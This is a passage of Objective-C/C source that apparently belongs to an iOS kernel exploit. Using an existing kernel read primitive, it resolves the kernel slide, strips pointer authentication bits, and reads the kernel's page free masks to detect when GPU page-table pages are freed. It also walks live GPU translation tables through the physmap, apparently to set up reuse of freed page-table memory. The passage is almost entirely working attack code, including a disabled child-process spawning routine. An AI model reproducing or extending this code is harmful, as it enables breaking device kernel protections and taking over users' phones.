} CNDUatE2ReuseReservation;

typedef struct {
    uint64_t virtualAddress;
    uint64_t physicalFrame;
    uint64_t leafEntry;
} CNDUatE2ReuseTranslation;

typedef struct {
    bool complete;
    uint64_t rootVirtual;
    uint64_t directoryVirtual;
    uint64_t tableVirtual;
    uint64_t rootPhysical;
    uint64_t directoryPhysical;
    uint64_t tablePhysical;
    NSUInteger rootCaptureIndex;
    NSUInteger directoryCaptureIndex;
    NSUInteger tableCaptureIndex;
} CNDUatE3CapturedPlan;

typedef struct {
    bool validated;
    uint64_t gpuAddress;
    NSUInteger rootIndex;
    NSUInteger catalogueIndex;
    NSUInteger directoryIndex;
    NSUInteger leafIndex;
    uint64_t rootPhysical;
    uint64_t rootVirtual;
    uint64_t rootEntryAddress;
    uint64_t rootEntry;
    uint64_t directoryPhysical;
    uint64_t directoryVirtual;
    uint64_t directoryEntryAddress;
    uint64_t directoryEntry;
    uint64_t tablePhysical;
    uint64_t tableVirtual;
    uint64_t leafEntryAddress;
    uint64_t leafEntry;
    uint64_t leafPhysical;
    uint64_t leafVirtual;
    bool leafInPhysmap;
} CNDUatE3LivePath;

typedef struct {
    uint64_t rootPhysical;
    uint64_t pageNumber;
    uint64_t clusterIndex;
    uint64_t wordAddress;
    uint64_t bitMask;
    uint64_t liveWord;
    uint64_t afterWord;
    NSUInteger afterPollAttempt;
    bool liveWordStable;
    bool liveBitClear;
    bool afterWordStable;
    bool afterBitSet;
} CNDUatE2FreeMaskOracle;

typedef struct {
    NSUInteger pagesFaulted;
    uint64_t words[4];
    bool stable[4];
    bool bitSet[4];
} CNDUatE2GuidedMaskPoll;

static bool CNDUatE2WriteAll(int fd, const void *bytes, size_t length)
{
    const uint8_t *cursor = bytes;
    while (length != 0) {
        ssize_t written = write(fd, cursor, length);
        if (written < 0 && errno == EINTR) continue;
        if (written <= 0) return false;
        cursor += (size_t)written;
        length -= (size_t)written;
    }
    return true;
}

static bool CNDUatE2ReadAll(int fd, void *bytes, size_t length)
{
    uint8_t *cursor = bytes;
    while (length != 0) {
        ssize_t consumed = read(fd, cursor, length);
        if (consumed < 0 && errno == EINTR) continue;
        if (consumed <= 0) return false;
        cursor += (size_t)consumed;
        length -= (size_t)consumed;
    }
    return true;
}

#if 0
// Retained only as the exact source record for the 2026-11-05 EPERM result.
// iOS denied same-app posix_spawn before creating a process.  main.m no longer
// dispatches this mode and the active retirement route cannot call it.
int CNDUatE2MetalChildMain(int argc, char *argv[])
{
    if (argc != 4 || argv[2] == NULL || argv[3] == NULL) return 64;
    char *readyEnd = NULL;
    char *releaseEnd = NULL;
    long readyLong = strtol(argv[2], &readyEnd, 10);
    long releaseLong = strtol(argv[3], &releaseEnd, 10);
    if (readyEnd == argv[2] || *readyEnd != '\0' ||
        releaseEnd == argv[3] || *releaseEnd != '\0' ||
        readyLong != CNDUatE2ChildReadyFD ||
        releaseLong != CNDUatE2ChildReleaseFD) {
        return 65;
    }

    int result = 70;
    @autoreleasepool {
        void *metalHandle = dlopen(
            "/System/Library/Frameworks/Metal.framework/Metal",
            RTLD_NOW | RTLD_LOCAL);
        CNDUatE1CreateMetalDeviceFn createMetal = metalHandle != NULL
            ? (CNDUatE1CreateMetalDeviceFn)dlsym(
                metalHandle, "MTLCreateSystemDefaultDevice") : NULL;
        id<CNDUatE1MetalDevice> device =
            createMetal != NULL ? createMetal() : nil;
        id<CNDUatE1MetalCommandQueue> queue =
            device != nil ? [device newCommandQueue] : nil;
        id<CNDUatE1MetalBuffer> buffer = device != nil
            ? [device newBufferWithLength:CNDUatE1PageSize options:0] : nil;
        void *contents = buffer != nil ? [buffer contents] : NULL;
        id<CNDUatE1MetalCommandBuffer> command =
            queue != nil ? [queue commandBuffer] : nil;
        id<CNDUatE1MetalBlitEncoder> blit =
            command != nil ? [command blitCommandEncoder] : nil;
        if (contents != NULL) memset(contents, 0, CNDUatE1PageSize);
        if (blit != nil && buffer != nil) {
            [blit fillBuffer:buffer range:NSMakeRange(0, CNDUatE1PageSize)
                       value:0x6d];
            [blit endEncoding];
            blit = nil;
        }
        if (metalHandle != NULL && createMetal != NULL && device != nil &&
            queue != nil && buffer != nil && contents != NULL &&
            command != nil) {
            [command commit];
            [command waitUntilCompleted];
        }
        NSUInteger status = command != nil ? [command status] : 0;
        NSError *error = command != nil ? [command error] : nil;
        bool verified = contents != NULL && error == nil;
        if (verified) {
            const uint8_t *bytes = contents;
            for (NSUInteger index = 0; index < CNDUatE1PageSize; index++) {
                if (bytes[index] != 0x6d) {
                    verified = false;
                    break;
                }
            }
        }

        CNDUatE2ChildMessage message = {
            .magic = CNDUatE2ChildMessageMagic,
            .version = CNDUatE2ChildMessageVersion,
            .result = verified ? 0 : 1,
            .pid = (uint32_t)getpid(),
            .metalStatus = (uint32_t)status,
            .fillVerified = verified ? 1U : 0U,
        };
        bool announced = CNDUatE2WriteAll(
            CNDUatE2ChildReadyFD, &message, sizeof(message));
        if (verified && announced) {
            uint8_t release = 0;
            bool released = CNDUatE2ReadAll(
                CNDUatE2ChildReleaseFD, &release, sizeof(release));
            if (released && release == CNDUatE2ChildReleaseByte) {
                // Deliberately bypass ARC/object teardown.  The live Metal
                // owners reach kernel task death as live process state, so
                // the observed clear cannot be attributed to setting the
                // device singleton to nil in-process (the failed C28 edge).
                _exit(0);
            }
            result = 71;
        }

        // All Metal owners are local to this disposable process.  Returning
        // from main tears down the task; the parent never closes the child's
        // connection and never shares its KRW descriptors with this exec.
        blit = nil;
        command = nil;
        buffer = nil;
        queue = nil;
        device = nil;
        if (metalHandle != NULL) dlclose(metalHandle);
    }
    close(CNDUatE2ChildReadyFD);
    close(CNDUatE2ChildReleaseFD);
    return result;
}

typedef struct {
    pid_t pid;
    int readyFD;
    int releaseFD;
    int spawnError;
    bool cloexecDefault;
} CNDUatE2SpawnedChild;

static CNDUatE2SpawnedChild CNDUatE2SpawnMetalChild(void)
{
    CNDUatE2SpawnedChild child = {
        .pid = -1, .readyFD = -1, .releaseFD = -1,
        .spawnError = 0, .cloexecDefault = false,
    };
#ifndef POSIX_SPAWN_CLOEXEC_DEFAULT
    child.spawnError = ENOTSUP;
    return child;
#else
    int readyPipe[2] = {-1, -1};
    int releasePipe[2] = {-1, -1};
    if (pipe(readyPipe) != 0 || pipe(releasePipe) != 0) {
        child.spawnError = errno;
        if (readyPipe[0] >= 0) close(readyPipe[0]);
        if (readyPipe[1] >= 0) close(readyPipe[1]);
        if (releasePipe[0] >= 0) close(releasePipe[0]);
        if (releasePipe[1] >= 0) close(releasePipe[1]);
        return child;
    }

    posix_spawn_file_actions_t actions;
    posix_spawnattr_t attributes;
    bool actionsInitialized = false;
    bool attributesInitialized = false;
    int error = posix_spawn_file_actions_init(&actions);
    if (error == 0) actionsInitialized = true;
    if (error == 0) {
        error = posix_spawnattr_init(&attributes);
        if (error == 0) attributesInitialized = true;
    }
    if (error == 0) {
        error = posix_spawnattr_setflags(
            &attributes, POSIX_SPAWN_CLOEXEC_DEFAULT);
    }
    if (error == 0) {
        error = posix_spawn_file_actions_adddup2(
            &actions, readyPipe[1], CNDUatE2ChildReadyFD);
    }
    if (error == 0) {
        error = posix_spawn_file_actions_adddup2(
            &actions, releasePipe[0], CNDUatE2ChildReleaseFD);
    }
    if (error == 0) {
        error = posix_spawn_file_actions_addclose(&actions, readyPipe[0]);
    }
    if (error == 0) {
        error = posix_spawn_file_actions_addclose(&actions, releasePipe[1]);
    }

    NSString *executable = NSBundle.mainBundle.executablePath;
    const char *path = executable.fileSystemRepresentation;
    char readyArgument[16] = {0};
    char releaseArgument[16] = {0};
    snprintf(readyArgument, sizeof(readyArgument), "%d",
             CNDUatE2ChildReadyFD);
    snprintf(releaseArgument, sizeof(releaseArgument), "%d",
             CNDUatE2ChildReleaseFD);
    char *const childArgv[] = {
        (char *)(path ?: ""), (char *)"--uat-e2-metal-child",
        readyArgument, releaseArgument, NULL,
    };
    if (error == 0 && path != NULL && path[0] != '\0') {
        error = posix_spawn(&child.pid, path, &actions, &attributes,
                            childArgv, environ);
    } else if (error == 0) {
        error = ENOENT;
    }
    if (actionsInitialized) posix_spawn_file_actions_destroy(&actions);
    if (attributesInitialized) posix_spawnattr_destroy(&attributes);
    close(readyPipe[1]);
    close(releasePipe[0]);
    if (error != 0) {
        close(readyPipe[0]);
        close(releasePipe[1]);
        child.pid = -1;
        child.spawnError = error;
        return child;
    }
    child.readyFD = readyPipe[0];
    child.releaseFD = releasePipe[1];
    child.cloexecDefault = true;
    return child;
#endif
}

static bool CNDUatE2WaitForChildMessage(
    int fd, CNDUatE2ChildMessage *message)
{
    if (fd < 0 || message == NULL) return false;
    struct pollfd pollFD = {.fd = fd, .events = POLLIN, .revents = 0};
    int result = 0;
    do {
        result = poll(&pollFD, 1, 15000);
    } while (result < 0 && errno == EINTR);
    if (result != 1 || (pollFD.revents & (POLLIN | POLLHUP)) == 0) {
        return false;
    }
    memset(message, 0, sizeof(*message));
    return CNDUatE2ReadAll(fd, message, sizeof(*message)) &&
        message->magic == CNDUatE2ChildMessageMagic &&
        message->version == CNDUatE2ChildMessageVersion;
}

static int CNDUatE2WaitForChildExit(
    pid_t pid, bool *timedOut, bool *killed, int *statusOut)
{
    if (timedOut != NULL) *timedOut = false;
    if (killed != NULL) *killed = false;
    if (statusOut != NULL) *statusOut = 0;
    if (pid <= 0) return EINVAL;
    int status = 0;
    for (NSUInteger attempt = 0; attempt < 200; attempt++) {
        pid_t result = waitpid(pid, &status, WNOHANG);
        if (result == pid) {
            if (statusOut != NULL) *statusOut = status;
            return 0;
        }
        if (result < 0 && errno != EINTR) return errno;
        usleep(10000);
    }
    if (timedOut != NULL) *timedOut = true;
    if (kill(pid, SIGKILL) == 0 && killed != NULL) *killed = true;
    while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {}
    if (statusOut != NULL) *statusOut = status;
    return ETIMEDOUT;
}
#endif

static NSString *CNDUatE2TokenHex(
    const uint8_t token[CNDUatE2ExternalTokenBytes])
{
    if (token == NULL) return @"";
    char text[CNDUatE2ExternalTokenBytes * 2 + 1] = {0};
    for (NSUInteger index = 0; index < CNDUatE2ExternalTokenBytes; index++) {
        snprintf(text + index * 2, 3, "%02x", token[index]);
    }
    return [NSString stringWithUTF8String:text] ?: @"";
}

static void CNDUatE2CloseExternalRendezvous(
    CNDUatE2ExternalRendezvous *rendezvous)
{
    if (rendezvous == NULL) return;
    if (rendezvous->peerFD >= 0) close(rendezvous->peerFD);
    if (rendezvous->listenFD >= 0) close(rendezvous->listenFD);
    rendezvous->peerFD = -1;
    rendezvous->listenFD = -1;
}

static bool CNDUatE2OpenExternalRendezvous(
    CNDUatE2ExternalRendezvous *rendezvous, int *errorOut)
{
    if (errorOut != NULL) *errorOut = 0;
    if (rendezvous == NULL) {
        if (errorOut != NULL) *errorOut = EINVAL;
        return false;
    }
    memset(rendezvous, 0, sizeof(*rendezvous));
    rendezvous->listenFD = -1;
    rendezvous->peerFD = -1;
    arc4random_buf(rendezvous->token, sizeof(rendezvous->token));

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        if (errorOut != NULL) *errorOut = errno;
        return false;
    }
    int one = 1;
    (void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    (void)setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));
    struct sockaddr_in address = {0};
    address.sin_len = sizeof(address);
    address.sin_family = AF_INET;
    address.sin_port = 0;
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(fd, (const struct sockaddr *)&address, sizeof(address)) != 0 ||
        listen(fd, 1) != 0) {
        int saved = errno;
        close(fd);
        if (errorOut != NULL) *errorOut = saved;
        return false;
    }
    socklen_t length = sizeof(address);
    if (getsockname(fd, (struct sockaddr *)&address, &length) != 0 ||
        length != sizeof(address) || address.sin_family != AF_INET ||
        address.sin_addr.s_addr != htonl(INADDR_LOOPBACK) ||
        address.sin_port == 0) {
        int saved = errno != 0 ? errno : EPROTO;
        close(fd);
        if (errorOut != NULL) *errorOut = saved;
        return false;
    }
    rendezvous->listenFD = fd;
    rendezvous->port = ntohs(address.sin_port);
    return true;
}

static bool CNDUatE2PollReadable(int fd, int timeoutMS)
{
    if (fd < 0) return false;
    struct pollfd pollFD = {.fd = fd, .events = POLLIN, .revents = 0};
    int result = 0;
    do {
        result = poll(&pollFD, 1, timeoutMS);
    } while (result < 0 && errno == EINTR);
    return result == 1 &&
        (pollFD.revents & (POLLIN | POLLHUP | POLLERR)) != 0;
}

static bool CNDUatE2AcceptExternalHelper(
    CNDUatE2ExternalRendezvous *rendezvous, int *errorOut)
{
    if (errorOut != NULL) *errorOut = 0;
    if (rendezvous == NULL || rendezvous->listenFD < 0) {
        if (errorOut != NULL) *errorOut = EINVAL;
        return false;
    }
    if (!CNDUatE2PollReadable(
            rendezvous->listenFD, CNDUatE2ExternalAcceptTimeoutMS)) {
        if (errorOut != NULL) *errorOut = ETIMEDOUT;
        return false;
    }
    struct sockaddr_in peer = {0};
    socklen_t peerLength = sizeof(peer);
    int peerFD = accept(rendezvous->listenFD,
                        (struct sockaddr *)&peer, &peerLength);
    if (peerFD < 0) {
        if (errorOut != NULL) *errorOut = errno;
        return false;
    }
    close(rendezvous->listenFD);
    rendezvous->listenFD = -1;
    if (peerLength != sizeof(peer) || peer.sin_family != AF_INET ||
        peer.sin_addr.s_addr != htonl(INADDR_LOOPBACK)) {
        close(peerFD);
        if (errorOut != NULL) *errorOut = EPERM;
        return false;
    }
    int one = 1;
    (void)setsockopt(peerFD, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));
    rendezvous->peerFD = peerFD;
    return true;
}

static bool CNDUatE2ReadExternalMessage(
    int fd, const uint8_t token[CNDUatE2ExternalTokenBytes],
    uint32_t expectedType, CNDUatE2ExternalMessage *message)
{
    if (fd < 0 || token == NULL || message == NULL ||
        !CNDUatE2PollReadable(fd, CNDUatE2ExternalMessageTimeoutMS)) {
        return false;
    }
    memset(message, 0, sizeof(*message));
    return CNDUatE2ReadAll(fd, message, sizeof(*message)) &&
        message->magic == CNDUatE2ExternalMessageMagic &&
        message->version == CNDUatE2ExternalMessageVersion &&
        message->type == expectedType && message->pid > 0 &&
        memcmp(message->token, token, CNDUatE2ExternalTokenBytes) == 0;
}

static bool CNDUatE2WaitForExternalPeerEOF(int fd)
{
    if (!CNDUatE2PollReadable(fd, CNDUatE2ExternalExitTimeoutMS)) {
        return false;
    }
    uint8_t unexpected = 0;
    ssize_t consumed = 0;
    do {
        consumed = read(fd, &unexpected, sizeof(unexpected));
    } while (consumed < 0 && errno == EINTR);
    return consumed == 0;
}

static bool CNDUatE2CheckedKernelPointer(
    const CNDUatE1API *api, uint64_t raw, uint64_t *pointerOut)
{
    if (api == NULL || raw == 0) {
        return false;
    }
    // Match the physical-proved Hail Mary walker's kread_ptr/xpaci behavior:
    // structure pointer fields may carry PAC in their high bits.  The source
    // address is already pinned by the object/offset chain; strip with this
    // boot's t1sz-derived mask, then require a canonical aligned kernel VA.
    uint64_t pointer = CNDUatE1CanonicalPointer(api, raw);
    if (pointer == 0 || (pointer & 0x7) != 0) return false;
    if (pointerOut != NULL) *pointerOut = pointer;
    return true;
}

static bool CNDUatE2AddSlide(
    uint64_t unslid, uint64_t slide, uint64_t *runtimeOut)
{
    if (slide > UINT64_MAX - unslid) return false;
    if (runtimeOut != NULL) *runtimeOut = unslid + slide;
    return true;
}

static bool CNDUatE2ReadStable64(
    const CNDUatE1API *api, uint64_t address, uint64_t *valueOut)
{
    uint64_t first = 0;
    uint64_t second = 0;
    if (!CNDUatE1Read64(api, address, &first) ||
        !CNDUatE1Read64(api, address, &second) || first != second) {
        return false;
    }
    if (valueOut != NULL) *valueOut = first;
    return true;
}

static bool CNDUatE2PrepareFreeMaskOracleAtPhysical(
    const CNDUatE1API *api, uint64_t maskBase, uint32_t firstPnum,
    uint64_t physical, CNDUatE2FreeMaskOracle *oracle,
    const char **reasonOut)
{
    if (api == NULL || maskBase == 0 || firstPnum == 0 ||
        physical == 0 || (physical & (CNDUatE1PageSize - 1)) != 0 ||
        oracle == NULL) {
        if (reasonOut != NULL) *reasonOut = "free-mask-physical-input-invalid";
        return false;
    }
    memset(oracle, 0, sizeof(*oracle));
    oracle->rootPhysical = physical;
    oracle->pageNumber = physical >> 14;
    if (oracle->pageNumber < firstPnum) {
        if (reasonOut != NULL) *reasonOut = "free-mask-physical-below-dram";
        return false;
    }
    uint64_t relative = oracle->pageNumber - firstPnum;
    oracle->clusterIndex = relative >> 7;
    uint64_t clusterOffset = 0;
    if (__builtin_mul_overflow(
            oracle->clusterIndex, UINT64_C(16), &clusterOffset) ||
        clusterOffset > UINT64_MAX - maskBase) {
        if (reasonOut != NULL) *reasonOut = "free-mask-index-overflow";
        return false;
    }
    uint64_t bit = oracle->pageNumber & UINT64_C(0x7f);
    uint64_t wordOffset = bit >= 64 ? UINT64_C(8) : UINT64_C(0);
    uint64_t clusterAddress = maskBase + clusterOffset;
    if (wordOffset > UINT64_MAX - clusterAddress) {
        if (reasonOut != NULL) *reasonOut = "free-mask-word-overflow";
        return false;
    }
    oracle->wordAddress = clusterAddress + wordOffset;
    oracle->bitMask = UINT64_C(1) << (bit & UINT64_C(63));
    oracle->liveWordStable = CNDUatE2ReadStable64(
        api, oracle->wordAddress, &oracle->liveWord);
    oracle->liveBitClear = oracle->liveWordStable &&
        (oracle->liveWord & oracle->bitMask) == 0;
    if (!oracle->liveBitClear) {
        if (reasonOut != NULL) {
            *reasonOut = oracle->liveWordStable
                ? "free-mask-physical-already-free-while-live"
                : "free-mask-live-word-unstable";
        }
        return false;
    }
    return true;
}

static bool CNDUatE2PrepareFreeMaskOracles(
    const CNDUatE1API *api, uint64_t slide, uint64_t root0,
    uint64_t root1, CNDUatE2FreeMaskOracle oracles[2],
    uint64_t *maskBaseOut, uint32_t *firstPnumOut,
    const char **reasonOut)
{
    if (api == NULL || oracles == NULL || root0 == 0 || root1 == 0 ||
        (root0 & (CNDUatE1PageSize - 1)) != 0 ||
        (root1 & (CNDUatE1PageSize - 1)) != 0) {
        if (reasonOut != NULL) *reasonOut = "free-mask-root-input-invalid";
        return false;
    }
    memset(oracles, 0, sizeof(CNDUatE2FreeMaskOracle) * 2);

    uint64_t masksSlot = 0;
    uint64_t firstPnumAddress = 0;
    if (!CNDUatE2AddSlide(
            CNDUatE2KernelVMPageFreeMasks, slide, &masksSlot) ||
        !CNDUatE2AddSlide(
            CNDUatE2KernelPmapFirstPnum, slide, &firstPnumAddress)) {
        if (reasonOut != NULL) *reasonOut = "free-mask-symbol-overflow";
        return false;
    }

    uint64_t maskBaseRaw = 0;
    uint64_t maskBase = 0;
    if (!CNDUatE2ReadStable64(api, masksSlot, &maskBaseRaw) ||
        !CNDUatE2CheckedKernelPointer(api, maskBaseRaw, &maskBase) ||
        maskBaseRaw != maskBase ||
        (maskBase & (sizeof(__uint128_t) - 1)) != 0) {
        if (reasonOut != NULL) *reasonOut = "free-mask-base-predicate-failed";
        return false;
    }

    uint32_t firstPnumA = 0;
    uint32_t firstPnumB = 0;
    if (!CNDUatE1Read32(api, firstPnumAddress, &firstPnumA) ||
        !CNDUatE1Read32(api, firstPnumAddress, &firstPnumB) ||
        firstPnumA == 0 || firstPnumA != firstPnumB) {
        if (reasonOut != NULL) *reasonOut = "free-mask-first-pnum-failed";
        return false;
    }

    const uint64_t roots[2] = {root0, root1};
    for (NSUInteger index = 0; index < 2; index++) {
        CNDUatE2FreeMaskOracle *oracle = &oracles[index];
        const char *oracleReason = NULL;
        if (!CNDUatE2PrepareFreeMaskOracleAtPhysical(
                api, maskBase, firstPnumA, roots[index], oracle,
                &oracleReason)) {
            if (reasonOut != NULL) {
                if (oracleReason != NULL &&
                    strcmp(oracleReason,
                           "free-mask-physical-below-dram") == 0) {
                    *reasonOut = "free-mask-root-below-dram";
                } else if (oracleReason != NULL &&
                    strcmp(oracleReason,
                           "free-mask-physical-already-free-while-live") == 0) {
                    *reasonOut = "free-mask-root-already-free-while-live";
                } else {
                    *reasonOut = oracleReason;
                }
            }
            return false;
        }
    }

    if (maskBaseOut != NULL) *maskBaseOut = maskBase;
    if (firstPnumOut != NULL) *firstPnumOut = firstPnumA;
    return true;
}

static bool CNDUatE2WaitForProcessGone(
    pid_t pid, NSUInteger *attemptsOut, int *lastErrnoOut)
{
    if (attemptsOut != NULL) *attemptsOut = 0;
    if (lastErrnoOut != NULL) *lastErrnoOut = 0;
    if (pid <= 1) return false;
    for (NSUInteger attempt = 0; attempt < CNDUatE2ProcessGonePollCount;
         attempt++) {
        if (attemptsOut != NULL) *attemptsOut = attempt + 1;
        errno = 0;
        int rc = kill(pid, 0);
        int observedErrno = errno;
        if (lastErrnoOut != NULL) *lastErrnoOut = observedErrno;
        if (rc == -1 && observedErrno == ESRCH) return true;
        if (rc != 0 && observedErrno != EPERM) return false;
        usleep(CNDUatE2PostExitPollIntervalUS);
    }
    return false;
}

static bool CNDUatE2ObserveFreeMaskTransitions(
    const CNDUatE1API *api, CNDUatE2FreeMaskOracle oracles[2],
    NSUInteger *attemptsOut, bool *allSetOut)
{
    if (attemptsOut != NULL) *attemptsOut = 0;
    if (allSetOut != NULL) *allSetOut = false;
    if (api == NULL || oracles == NULL) return false;

    for (NSUInteger attempt = 0; attempt < CNDUatE2FreeMaskPollCount;
         attempt++) {
        if (attemptsOut != NULL) *attemptsOut = attempt + 1;
        for (NSUInteger index = 0; index < 2; index++) {
            CNDUatE2FreeMaskOracle *oracle = &oracles[index];
            if (oracle->afterBitSet) continue;
            uint64_t word = 0;
            bool stable = CNDUatE2ReadStable64(
                api, oracle->wordAddress, &word);
            if (!stable) continue;
            oracle->afterWordStable = true;
            oracle->afterWord = word;
            if ((word & oracle->bitMask) != 0) {
                oracle->afterBitSet = true;
                oracle->afterPollAttempt = attempt + 1;
            }
        }
        bool allSet = oracles[0].afterBitSet && oracles[1].afterBitSet;
        if (allSet) {
            if (allSetOut != NULL) *allSetOut = true;
            return true;
        }
        if (attempt + 1 < CNDUatE2FreeMaskPollCount) {
            usleep(CNDUatE2PostExitPollIntervalUS);
        }
    }
    return oracles[0].afterWordStable && oracles[1].afterWordStable;
}

static bool CNDUatE3PrepareLivePathFreeMaskOracles(
    const CNDUatE1API *api, uint64_t maskBase, uint32_t firstPnum,
    const CNDUatE3LivePath *path, CNDUatE2FreeMaskOracle oracles[2],
    const char **reasonOut)
{
    if (api == NULL || path == NULL || !path->validated || oracles == NULL) {
        if (reasonOut != NULL) *reasonOut = "e3-path-oracle-input-invalid";
        return false;
    }
    memset(oracles, 0, sizeof(CNDUatE2FreeMaskOracle) * 2);
    const uint64_t targets[2] = {
        path->directoryPhysical, path->tablePhysical,
    };
    for (NSUInteger index = 0; index < 2; index++) {
        if (!CNDUatE2PrepareFreeMaskOracleAtPhysical(
                api, maskBase, firstPnum, targets[index], &oracles[index],
                reasonOut)) {
            return false;
        }
    }
    return true;
}

static bool CNDUatE3ObserveLivePathFreeMaskTransitions(
    const CNDUatE1API *api, CNDUatE2FreeMaskOracle oracles[2],
    NSUInteger *attemptsOut, NSUInteger *setCountOut)
{
    if (attemptsOut != NULL) *attemptsOut = 0;
    if (setCountOut != NULL) *setCountOut = 0;
    if (api == NULL || oracles == NULL) return false;
    for (NSUInteger attempt = 0; attempt < CNDUatE2FreeMaskPollCount;
         attempt++) {
        if (attemptsOut != NULL) *attemptsOut = attempt + 1;
        NSUInteger setCount = 0;
        bool allStable = true;
        for (NSUInteger index = 0; index < 2; index++) {
            CNDUatE2FreeMaskOracle *oracle = &oracles[index];
            if (!oracle->afterBitSet) {
                uint64_t word = 0;
                bool stable = CNDUatE2ReadStable64(
                    api, oracle->wordAddress, &word);
                if (stable) {
                    oracle->afterWordStable = true;
                    oracle->afterWord = word;
                    if ((word & oracle->bitMask) != 0) {
                        oracle->afterBitSet = true;
                        oracle->afterPollAttempt = attempt + 1;
                    }
                }
            }
            allStable = allStable && oracle->afterWordStable;
            if (oracle->afterBitSet) setCount++;
        }
        if (setCountOut != NULL) *setCountOut = setCount;
        if (setCount == 2) return true;
        if (attempt + 1 < CNDUatE2FreeMaskPollCount) {
            usleep(CNDUatE2PostExitPollIntervalUS);
        } else {
            return allStable;
        }
    }
    return false;
}

static bool CNDUatE2PhysicalToKernelVirtual(
    const CNDUatE2CheckedWalker *walker, uint64_t physical,
    uint64_t *virtualOut)
{
    if (walker == NULL || physical == 0) return false;
    for (NSUInteger index = 0; index < walker->rangeCount; index++) {
        CNDUatE2PTOVEntry entry = walker->ranges[index];
        if (physical >= entry.physicalAddress &&
            physical - entry.physicalAddress < entry.length) {
            uint64_t delta = physical - entry.physicalAddress;
            if (delta > UINT64_MAX - entry.virtualAddress) return false;
            uint64_t virtualAddress = entry.virtualAddress + delta;
            if ((virtualAddress & 0x7) != 0) return false;
            if (virtualOut != NULL) *virtualOut = virtualAddress;
            return true;
        }
    }
    return false;
}

static bool CNDUatE2WalkerAnchorsStable(
    const CNDUatE1API *api, const CNDUatE2CheckedWalker *walker)
{
    if (api == NULL || walker == NULL) return false;
    if (walker->rangeStateAddress < CNDUatE2KernelPhysmapRangeState) {
        return false;
    }
    uint64_t slide =
        walker->rangeStateAddress - CNDUatE2KernelPhysmapRangeState;
    uint64_t gVirtBaseAddress = 0;
    uint64_t gPhysBaseAddress = 0;
    uint64_t gPhysSizeAddress = 0;
    if (!CNDUatE2AddSlide(
            CNDUatE1GVirtBase, slide, &gVirtBaseAddress) ||
        !CNDUatE2AddSlide(
            CNDUatE2KernelGPhysBase, slide, &gPhysBaseAddress) ||
        !CNDUatE2AddSlide(
            CNDUatE1GPhysSize, slide, &gPhysSizeAddress)) {
        return false;
    }
    uint64_t gVirtBase = 0;
    uint64_t gPhysBase = 0;
    uint64_t gPhysSize = 0;
    uint32_t rangeState = 0;
    uint64_t countAddress = 0;
    uint64_t recordsAddress = 0;
    uint32_t count = 0;
    return CNDUatE1Read64(api, gVirtBaseAddress, &gVirtBase) &&
        CNDUatE1Read64(api, gPhysBaseAddress, &gPhysBase) &&
        CNDUatE1Read64(api, gPhysSizeAddress, &gPhysSize) &&
        CNDUatE1Read32(api, walker->rangeStateAddress, &rangeState) &&
        CNDUatE1Read64(api, walker->rangeCountPointerAddress, &countAddress) &&
        CNDUatE1Read64(api, walker->rangeRecordsPointerAddress,
                       &recordsAddress) &&
        CNDUatE1Read32(api, walker->rangeCountAddress, &count) &&
        gVirtBase == walker->gVirtBase &&
        gPhysBase == walker->gPhysBase &&
        gPhysSize == walker->gPhysSize &&
        (uint8_t)rangeState == walker->rangeState &&
        countAddress == walker->rangeCountAddress &&
        recordsAddress == walker->rangeRecordsAddress &&
        count == walker->rangeCount;
}

static bool CNDUatE3ResolveLivePath(
    const CNDUatE1API *api, const CNDUatE2CheckedWalker *walker,
    uint64_t gpuAddress, uint64_t root0, uint64_t root1,
    CNDUatE3LivePath *path, const char **reasonOut)
{
    if (reasonOut != NULL) *reasonOut = NULL;
    if (path != NULL) memset(path, 0, sizeof(*path));
    if (api == NULL || walker == NULL || path == NULL || gpuAddress == 0 ||
        (gpuAddress & (CNDUatE1PageSize - 1)) != 0 ||
        gpuAddress >= UINT64_C(0x0001000000000000) ||
        root0 == 0 || root1 == 0 ||
        (root0 & (CNDUatE1PageSize - 1)) != 0 ||
        (root1 & (CNDUatE1PageSize - 1)) != 0) {
        if (reasonOut != NULL) *reasonOut = "e3-live-path-input-invalid";
        return false;
    }

    path->gpuAddress = gpuAddress;
    path->rootIndex = (NSUInteger)((gpuAddress >> 42) & 1);
    path->catalogueIndex = (NSUInteger)((gpuAddress >> 36) & 0x3f);
    path->directoryIndex = (NSUInteger)((gpuAddress >> 25) & 0x7ff);
    path->leafIndex = (NSUInteger)((gpuAddress >> 14) & 0x7ff);
    path->rootPhysical = path->rootIndex == 0 ? root0 : root1;
    if (!CNDUatE2PhysicalToKernelVirtual(
            walker, path->rootPhysical, &path->rootVirtual)) {
        if (reasonOut != NULL) *reasonOut = "e3-live-root-not-in-physmap";
        return false;
    }

    path->rootEntryAddress = path->rootVirtual +
        path->catalogueIndex * sizeof(uint64_t);
    if (!CNDUatE2ReadStable64(
            api, path->rootEntryAddress, &path->rootEntry) ||
        (path->rootEntry & 3) != 3) {
        if (reasonOut != NULL) *reasonOut = "e3-live-root-entry-invalid";
        return false;
    }
    path->directoryPhysical =
        path->rootEntry & CNDUatE1TTBATPaddrMask;
    if (path->directoryPhysical == 0 ||
        (path->directoryPhysical & (CNDUatE1PageSize - 1)) != 0 ||
        !CNDUatE2PhysicalToKernelVirtual(
            walker, path->directoryPhysical, &path->directoryVirtual)) {
        if (reasonOut != NULL) *reasonOut = "e3-live-directory-not-in-physmap";
        return false;
    }

    path->directoryEntryAddress = path->directoryVirtual +
        path->directoryIndex * sizeof(uint64_t);
    if (!CNDUatE2ReadStable64(
            api, path->directoryEntryAddress, &path->directoryEntry) ||
        (path->directoryEntry & 3) != 3) {
        if (reasonOut != NULL) *reasonOut = "e3-live-directory-entry-invalid";
        return false;
    }
    path->tablePhysical =
        path->directoryEntry & CNDUatE1TTBATPaddrMask;
    if (path->tablePhysical == 0 ||
        (path->tablePhysical & (CNDUatE1PageSize - 1)) != 0 ||
        !CNDUatE2PhysicalToKernelVirtual(
            walker, path->tablePhysical, &path->tableVirtual)) {
        if (reasonOut != NULL) *reasonOut = "e3-live-table-not-in-physmap";
        return false;
    }

    path->leafEntryAddress = path->tableVirtual +
        path->leafIndex * sizeof(uint64_t);
    if (!CNDUatE2ReadStable64(
            api, path->leafEntryAddress, &path->leafEntry) ||
        (path->leafEntry & 1) == 0) {
